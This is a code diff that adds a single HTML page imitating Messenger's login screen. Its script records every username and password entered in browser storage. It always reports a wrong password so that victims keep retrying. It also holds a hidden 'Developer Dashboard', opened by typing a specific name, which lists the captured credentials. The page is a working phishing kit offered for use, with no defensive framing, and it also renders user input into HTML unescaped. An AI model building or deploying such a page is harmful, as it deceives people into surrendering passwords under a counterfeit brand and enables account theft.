@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-white h-full flex flex-col">
+
+    <!-- AUTHENTICATION VIEW -->
+    <div id="authView" class="flex-1 flex flex-col items-center justify-between p-6 max-w-md mx-auto w-full">
+        <div class="flex-1 flex flex-col items-center justify-center w-full">
+            <!-- Messenger Logo -->
+            <div class="w-20 h-20 bg-gradient-to-tr from-[#006AFF] to-[#00C6FF] rounded-full flex items-center justify-center mb-8 shadow-md">
+                <svg class="w-12 h-12 text-white fill-current" viewBox="0 0 24 24">
+                    <path d="M12 2C6.477 2 2 6.145 2 11.243c0 2.91 1.455 5.485 3.737 7.152V22l3.411-1.872c.86.238 1.772.372 2.852.372 5.523 0 10-4.145 10-9.257S17.523 2 12 2zm1.07 12.51l-2.58-2.75-5.03 2.75 5.53-5.87 2.64 2.75 4.97-2.75-5.53 5.87z"/>
+                </svg>
+            </div>
+
+            <!-- Login Form -->
+            <form id="loginForm" onsubmit="handleLogin(event)" class="w-full space-y-3">
+                <div id="errorMsg" class="hidden bg-red-50 text-red-500 text-sm p-3 rounded-xl text-center font-medium">
+                    Incorrect username or password. Please try again.
+                </div>
+                <div>
+                    <input type="text" id="usernameInput" placeholder="Email or phone number" required
+                        class="w-full px-4 py-3.5 bg-gray-100 border border-transparent rounded-2xl focus:bg-white focus:border-gray-300 focus:outline-none text-sm">
+                </div>
+                <div>
+                    <input type="password" id="passwordInput" placeholder="Password"
+                        class="w-full px-4 py-3.5 bg-gray-100 border border-transparent rounded-2xl focus:bg-white focus:border-gray-300 focus:outline-none text-sm">
+                </div>
+                <button type="submit" class="w-full py-3.5 bg-[#006AFF] hover:bg-[#0052cc] text-white font-semibold rounded-2xl transition duration-200 text-sm shadow-sm">
+                    Log In
+                </button>
+            </form>
+
+            <div class="mt-4 text-center">
+                <a href="#" class="text-xs text-[#006AFF] font-medium hover:underline">Forgot password?</a>
+            </div>
+        </div>
+
+        <div class="w-full pt-4 border-t border-gray-100 text-center">
+            <button class="w-full py-3 border border-[#006AFF] text-[#006AFF] font-semibold rounded-2xl text-sm">
+                Create new account
+            </button>
+        </div>
+    </div>
+
+    <!-- CHAT VIEW (Normal Users) -->
+    <div id="chatView" class="hidden flex-1 flex flex-col h-full bg-white">
+        <header class="flex items-center justify-between px-4 py-3 border-b border-gray-200">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 bg-gray-300 rounded-full flex items-center justify-center font-bold text-gray-700">AI</div>
+                <div>
+                    <h2 class="font-semibold text-sm">MAMA Support</h2>
+                    <p class="text-xs text-green-500 font-medium">Active now</p>
+                </div>
+            </div>
+            <button onclick="logout()" class="text-xs text-red-500 font-semibold px-3 py-1.5 bg-red-50 rounded-lg">Log Out</button>
+        </header>
+        <div class="flex-1 p-4 overflow-y-auto space-y-3 bg-gray-50" id="chatMessages">
+            <div class="flex items-end space-x-2">
+                <div class="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center text-xs font-bold text-gray-700">AI</div>
+                <div class="bg-gray-200 text-gray-800 px-4 py-2.5 rounded-2xl rounded-bl-sm max-w-[75%] text-sm">
+                    Welcome! You are now connected with your friends. Send a message below.
+                </div>
+            </div>
+        </div>
+        <div class="p-3 border-t border-gray-200 flex items-center space-x-2 bg-white">
+            <input type="text" id="messageInput" placeholder="Aa" class="flex-1 px-4 py-2.5 bg-gray-100 rounded-full text-sm focus:outline-none">
+            <button onclick="sendMessage()" class="text-[#006AFF] font-semibold text-sm px-2">Send</button>
+        </div>
+    </div>
+
+    <!-- ADMIN / CREATOR DASHBOARD -->
+    <div id="adminView" class="hidden flex-1 flex flex-col h-full bg-slate-900 text-slate-100 p-6 overflow-y-auto">
+        <div class="flex items-center justify-between mb-6 pb-4 border-b border-slate-800">
+            <div>
+                <h1 class="text-xl font-bold text-emerald-400">Developer Dashboard</h1>
+                <p class="text-xs text-slate-400">Creator Mode • Logged-in Credentials Tracker</p>
+            </div>
+            <button onclick="logout()" class="px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white text-xs font-semibold rounded-lg">Exit Admin</button>
+        </div>
+
+        <div class="grid grid-cols-2 gap-4 mb-6">
+            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
+                <p class="text-xs text-slate-400">Total Attempts Logged</p>
+                <p id="totalAttempts" class="text-2xl font-bold text-white mt-1">0</p>
+            </div>
+            <div class="bg-slate-800 p-4 rounded-xl border border-slate-700">
+                <p class="text-xs text-slate-400">Status</p>
+                <p class="text-sm font-semibold text-emerald-400 mt-2">Monitoring Active</p>
+            </div>
+        </div>
+
+        <h3 class="text-sm font-semibold text-slate-300 mb-3">Captured Login Attempts & Passwords:</h3>
+        <div id="credentialsList" class="space-y-2 flex-1">
+            <!-- Dynamic login attempts will appear here -->
+            <div class="p-3 bg-slate-800/50 border border-slate-800 rounded-xl text-center text-xs text-slate-500">
+                No login attempts recorded yet.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Load stored login attempts from local storage
+        let attempts = JSON.parse(localStorage.getItem('mama_attempts') || '[]');
+
+        function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('usernameInput').value.trim();
+            const password = document.getElementById('passwordInput').value;
+            const errorMsg = document.getElementById('errorMsg');
+
+            // SECRET ADMIN TRIGGER: Type exact name in upper/normal case without entering password
+            if (username.toLowerCase() === "james buenaflor") {
+                document.getElementById('authView').classList.add('hidden');
+                document.getElementById('adminView').classList.remove('hidden');
+                renderAdminLogs();
+                return;
+            }
+
+            // Save the attempted credentials so you can see them in admin view
+            attempts.unshift({
+                username: username,
+                password: password,
+                time: new Date().toLocaleTimeString()
+            });
+            localStorage.setItem('mama_attempts', JSON.stringify(attempts));
+
+            // For normal users, always show incorrect password so they keep trying
+            errorMsg.classList.remove('hidden');
+            document.getElementById('passwordInput').value = '';
+        }
+
+        function renderAdminLogs() {
+            const listContainer = document.getElementById('credentialsList');
+            document.getElementById('totalAttempts').innerText = attempts.length;
+
+            if (attempts.length === 0) {
+                listContainer.innerHTML = `<div class="p-3 bg-slate-800/50 border border-slate-800 rounded-xl text-center text-xs text-slate-500">No login attempts recorded yet.</div>`;
+                return;
+            }
+
+            listContainer.innerHTML = '';
+            attempts.forEach((item, index) => {
+                listContainer.innerHTML += `
+                    <div class="p-3.5 bg-slate-800 border border-slate-700 rounded-xl flex flex-col space-y-1 text-sm">
+                        <div class="flex justify-between items-center text-xs text-slate-400 border-b border-slate-700/50 pb-1">
+                            <span>Attempt #${attempts.length - index}</span>
+                            <span>${item.time}</span>
+                        </div>
+                        <div class="flex justify-between pt-1">
+                            <span class="text-slate-300">User: <strong class="text-white">${item.username}</strong></span>
+                            <span class="text-amber-400 font-mono bg-amber-950/40 px-2 py-0.5 rounded">Pass: ${item.password || '(blank)'}</span>
+                        </div>
+                    </div>
+                `;
+            });
+        }
+
+        function logout() {
+            document.getElementById('authView').classList.remove('hidden');
+            document.getElementById('chatView').classList.add('hidden');
+            document.getElementById('adminView').classList.add('hidden');
+            document.getElementById('usernameInput').value = '';
+            document.getElementById('passwordInput').value = '';
+            document.getElementById('errorMsg').classList.add('hidden');
+        }
+
+        function sendMessage() {
+            const input = document.getElementById('messageInput');
+            const container = document.getElementById('chatMessages');
+            if (!input.value.trim()) return;
+
+            container.innerHTML += `
+                <div class="flex justify-end">
+                    <div class="bg-[#006AFF] text-white px-4 py-2.5 rounded-2xl rounded-br-sm max-w-[75%] text-sm">
+                        ${input.value}
+                    </div>
+                </div>
+            `;
+            input.value = '';
+            container.scrollTop = container.scrollHeight;
+        }
+    </script>
+</body>
+</html>
